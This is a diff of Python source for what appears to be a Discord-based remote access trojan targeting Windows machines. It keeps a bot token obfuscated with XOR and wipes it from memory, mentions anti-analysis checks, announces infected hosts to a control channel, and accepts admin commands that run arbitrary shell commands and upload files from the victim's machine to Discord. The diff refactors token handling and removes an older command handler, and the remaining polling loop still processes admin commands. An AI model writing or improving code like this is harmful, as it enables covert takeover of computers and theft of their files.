@@ -65,7 +65,7 @@ def _decode_bytes(xored_list, key):
 _CHANNEL = int(_decode_bytes(_CHANNEL_XORED, _XOR_KEY).decode("utf-8"))
 _ADMIN = int(_decode_bytes(_ADMIN_XORED, _XOR_KEY).decode("utf-8"))
 
-# Wipe the XOR source lists for channel and admin
+# Wipe the XOR source lists for channel and admin (they're decoded, no longer needed)
 _wipe_xor_list(_CHANNEL_XORED)
 _wipe_xor_list(_ADMIN_XORED)
 
@@ -78,40 +78,38 @@ COMPUTER_NAME = platform.node().upper()
 
 # ── HTTP helpers ─────────────────────────────────────────────────────────
 DISCORD_API_BASE = "https://discord.com/api/v10"
-_headers = None  # set when token is decoded
 
 
-def _decode_token_and_set_auth():
+def _get_token_string():
     """
-    Decode the bot token at the last moment and set the HTTP auth header.
+    Decode the bot token from XOR-obfuscated source into a string, then
+    wipe the decode buffer. Returns a new string each call — the string is
+    short-lived (released after each HTTP call), reducing the time the
+    plaintext token exists in memory.
 
-    The token XOR bytes are decoded into a ctypes buffer, converted to a
-    string for the HTTP header, then the buffer is wiped. The string lives
-    in _headers dict for the life of the process (needed for every HTTP
-    call) — this is unavoidable with urllib, but the XOR source and the
-    decode buffer are wiped immediately, reducing the in-memory footprint.
+    The XOR source list (_TOKEN_XORED) is NOT wiped — it persists as
+    obfuscated data, and is re-decoded on each call.
     """
-    global _headers
     buf = ctypes.create_string_buffer(len(_TOKEN_XORED))
     for i, b in enumerate(_TOKEN_XORED):
         buf[i] = b ^ _XOR_KEY
-    # Wipe the XOR source list
-    _wipe_xor_list(_TOKEN_XORED)
     token_str = buf.value.decode("utf-8")
     ctypes.memset(ctypes.addressof(buf), 0, len(_TOKEN_XORED))
     del buf
-    _headers = {"Authorization": f"Bot {token_str}"}
+    return token_str
 
 
 def _http_get(path):
     """GET a Discord API endpoint. Returns parsed JSON or None on error."""
     url = DISCORD_API_BASE + path
-    req = urllib.request.Request(url, headers=_headers)
+    req = urllib.request.Request(
+        url,
+        headers={"Authorization": f"Bot {_get_token_string()}"},
+    )
     try:
         with urllib.request.urlopen(req, timeout=15) as resp:
             return json.loads(resp.read().decode("utf-8"))
-    except urllib.error.HTTPError as e:
-        # Rate limited or auth error — return None, caller handles
+    except urllib.error.HTTPError:
         return None
     except (urllib.error.URLError, OSError, Exception):
         return None
@@ -125,12 +123,12 @@ def _http_post(path, data=None, files=None):
     files: list of (field_name, filename, file_bytes) for multipart upload
     """
     url = DISCORD_API_BASE + path
+    token = _get_token_string()
 
     if files:
         # Multipart file upload
         boundary = f"----_{uuid.uuid4().hex}"
         body = b""
-        # JSON fields first
         if data:
             for name, value in data.items():
                 body += (
@@ -140,7 +138,6 @@ def _http_post(path, data=None, files=None):
                     f"\r\n"
                     f"{value}\r\n"
                 ).encode("utf-8")
-        # File fields
         for field_name, filename, file_bytes in files:
             body += (
                 f"--{boundary}\r\n"
@@ -157,18 +154,17 @@ def _http_post(path, data=None, files=None):
             url,
             data=body,
             headers={
-                "Authorization": _headers["Authorization"],
+                "Authorization": f"Bot {token}",
                 "Content-Type": f"multipart/form-data; boundary={boundary}",
             },
         )
     else:
-        # JSON POST
         payload = json.dumps(data).encode("utf-8") if data else b""
         req = urllib.request.Request(
             url,
             data=payload,
             headers={
-                "Authorization": _headers["Authorization"],
+                "Authorization": f"Bot {token}",
                 "Content-Type": "application/json",
             },
         )
@@ -179,7 +175,7 @@ def _http_post(path, data=None, files=None):
             if raw:
                 return json.loads(raw.decode("utf-8"))
             return {}
-    except urllib.error.HTTPError as e:
+    except urllib.error.HTTPError:
         return None
     except (urllib.error.URLError, OSError, Exception):
         return None
@@ -229,165 +225,15 @@ def _send_file(file_path, caption):
         )
         return False
 
-    success = _http_post(
+    return _http_post(
         f"/channels/{_CHANNEL}/messages",
         data={"content": caption},
         files=[("files[0]", os.path.basename(file_path), file_bytes)],
-    )
-    return success is not None
+    ) is not None
 
 
 # ── Polling loop ─────────────────────────────────────────────────────────
 
-def _process_messages(messages):
-    """
-    Process a batch of messages from the control channel.
-    Processes newest first. Stops after handling one command target match.
-    Returns the ID of the last processed message (to update _LAST_MESSAGE_ID).
-    """
-    global _LAST_MESSAGE_ID
-
-    # Messages from Discord API are newest first
-    for msg in messages:
-        msg_id = msg.get("id")
-        if _LAST_MESSAGE_ID and msg_id == _LAST_MESSAGE_ID:
-            continue
-
-        author = msg.get("author", {})
-        author_id = author.get("id")
-        content = msg.get("content", "")
-
-        # Ignore messages from the bot itself or non-admins
-        if author_id == _ADMIN:
-            pass  # will check content below
-        else:
-            continue
-
-        # ── FEATURE 1: Target execution ────────────────────────────────
-        if content.startswith("!exec "):
-            parts = content[6:].split(" ", 1)
-            if len(parts) < 2:
-                continue
-
-            target_machine = parts[0].upper()
-            command = parts[1]
-
-            if target_machine == COMPUTER_NAME:
-                _send_message(
-                    f"\u2699\ufe0f `[{COMPUTER_NAME}]` "
-                    f"Running command: `{command}`..."
-                )
-
-                ok, output = _run_command(command)
-
-                if not ok:
-                    _send_message(
-                        f"\u274c `[{COMPUTER_NAME}]` {output}"
-                    )
-                elif len(output) > 1900:
-                    # Write to temp file and upload
-                    tmp_path = f"{COMPUTER_NAME}_out.txt"
-                    try:
-                        with open(tmp_path, "w", encoding="utf-8") as f:
-                            f.write(output)
-                        _send_file(
-                            tmp_path,
-                            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
-                            "Output too long for chat. Sent as file:",
-                        )
-                        os.remove(tmp_path)
-                    except Exception:
-                        _send_message(
-                            f"\u274c `[{COMPUTER_NAME}]` "
-                            "Failed to send output file."
-                        )
-                else:
-                    _send_message(
-                        f"```cmd\n[{COMPUTER_NAME} Output]\n{output}\n```"
-                    )
-
-                # Update last seen ID after handling
-                if msg_id:
-                    _LAST_MESSAGE_ID = msg_id
-                return True  # handled one command, stop processing this batch
-
-        # ── FEATURE 2: File Download ───────────────────────────────────
-        elif content.startswith("!download "):
-            parts = content[10:].split(" ", 1)
-            if len(parts) < 2:
-                continue
-
-            target_machine = parts[0].upper()
-            file_path = parts[1].strip().replace('"', "")
-
-            if target_machine == COMPUTER_NAME:
-                if not os.path.exists(file_path):
-                    _send_message(
-                        f"\u274c `[{COMPUTER_NAME}]` "
-                        "Error: File path does not exist."
-                    )
-                else:
-                    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
-                    if file_size_mb > 25:
-                        _send_message(
-                            f"\u274c `[{COMPUTER_NAME}]` "
-                            f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
-                        )
-                    else:
-                        _send_message(
-                            f"\U0001f4e4 `[{COMPUTER_NAME}]` "
-                            f"Uploading: `{os.path.basename(file_path)}`..."
-                        )
-                        ok = _send_file(
-                            file_path,
-                            f"\u2705 File fetched from `[{COMPUTER_NAME}]`:",
-                        )
-                        if not ok:
-                            _send_message(
-                                f"\u274c `[{COMPUTER_NAME}]` "
-                                "Upload failed."
-                            )
-
-                if msg_id:
-                    _LAST_MESSAGE_ID = msg_id
-                return True  # handled one command
-
-        # ── FEATURE 3: Broadcast Ping ────────────────────────────────
-        elif content.strip() == "!pingall":
-            _send_message(
-                f"\U0001f44b `[{COMPUTER_NAME}]` is alive and active!"
-            )
-            if msg_id:
-                _LAST_MESSAGE_ID = msg_id
-            return True  # handled
-
-    return False  # no command handled in this batch
-
-
-def _fetch_and_process():
-    """Fetch messages from the control channel and process new ones."""
-    # Fetch newest 5 messages
-    messages = _http_get(f"/channels/{_CHANNEL}/messages?limit=5")
-    if not messages:
-        return
-
-    if not isinstance(messages, list):
-        return
-
-    # Process newest first (Discord returns newest first)
-    messages.reverse()  # now oldest first in the list; we'll iterate and stop
-
-    # Actually, let's process from the end (newest) backwards
-    for msg in reversed(messages):
-        _process_messages([msg])
-        # If _LAST_MESSAGE_ID was updated, we handled something — but
-        # _process_messages stops after one command. Continue checking older
-        # messages in case multiple commands were sent.
-        # However, to keep it simple: process all messages, newest first,
-        # and update _LAST_MESSAGE_ID to the newest processed.
-
-
-# Simpler polling: fetch, process all new messages, update last ID
 def _poll():
     """One polling cycle: fetch messages, process new ones, update state."""
     global _LAST_MESSAGE_ID
@@ -396,20 +242,17 @@ def _poll():
     if not messages or not isinstance(messages, list):
         return
 
-    # Discord returns newest first. Find the newest message we haven't seen.
     newest_processed = _LAST_MESSAGE_ID
 
     for msg in messages:
         msg_id = msg.get("id")
         if _LAST_MESSAGE_ID and msg_id == _LAST_MESSAGE_ID:
-            # Already seen this one and all newer ones (since list is newest first)
             break
 
         author = msg.get("author", {})
         author_id = author.get("id")
         content = msg.get("content", "")
 
-        # Only process messages from the admin
         if author_id != _ADMIN:
             continue
 
@@ -496,7 +339,6 @@ def _poll():
         if handled:
             newest_processed = msg_id
 
-    # Update last seen ID to the newest message we processed
     if newest_processed:
         _LAST_MESSAGE_ID = newest_processed
 
@@ -508,26 +350,15 @@ def main():
     Main entry point.
 
     1. Run anti-analysis defenses (exits silently if compromised).
-    2. Decode the bot token at the last moment (right before polling starts).
-    3. Announce presence (optional — via a REST message).
-    4. Enter the polling loop.
+    2. Decode channel + admin at startup (small ints, less sensitive).
+    3. Announce presence via REST API.
+    4. Enter the polling loop. Token is decoded per-request, not cached.
     """
-    # Step 1: defenses already run at import time (top of file)
-
-    # Step 2: decode token and set up HTTP headers
-    _decode_token_and_set_auth()
-
-    # Clear the XOR source list for the token (already wiped in _decode_token_and_set_auth)
-    # but ensure _TOKEN_XORED is zeroed
-    _wipe_xor_list(_TOKEN_XORED)
-
-    # Step 3: announce presence
     _send_message(
         f"\U0001f5a5\ufe0f **Windows Target [{COMPUTER_NAME}] is online.** "
         "Ready for actions."
     )
 
-    # Step 4: poll loop
     while True:
         _poll()
         time.sleep(5)
